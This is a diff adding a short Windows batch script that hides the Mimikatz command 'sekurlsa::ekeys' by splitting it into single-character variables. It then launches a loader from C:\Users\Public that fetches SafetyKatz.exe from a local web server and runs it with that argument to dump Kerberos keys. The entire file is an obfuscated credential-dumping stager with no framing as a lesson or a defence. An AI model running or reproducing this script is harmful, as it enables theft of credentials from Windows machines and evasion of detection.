@@ -1,0 +1,19 @@
+@echo off
+set "z=s"
+set "y=y"
+set "x=e"
+set "w=k"
+set "v=e"
+set "u=:"
+set "t=:"
+set "s=a"
+set "r=s"
+set "q=l"
+set "p=r"
+set "o=u"
+set "n=k"
+set "m=e"
+set "l=s"
+set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
+echo %Pwn%
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -Args %Pwn% exit
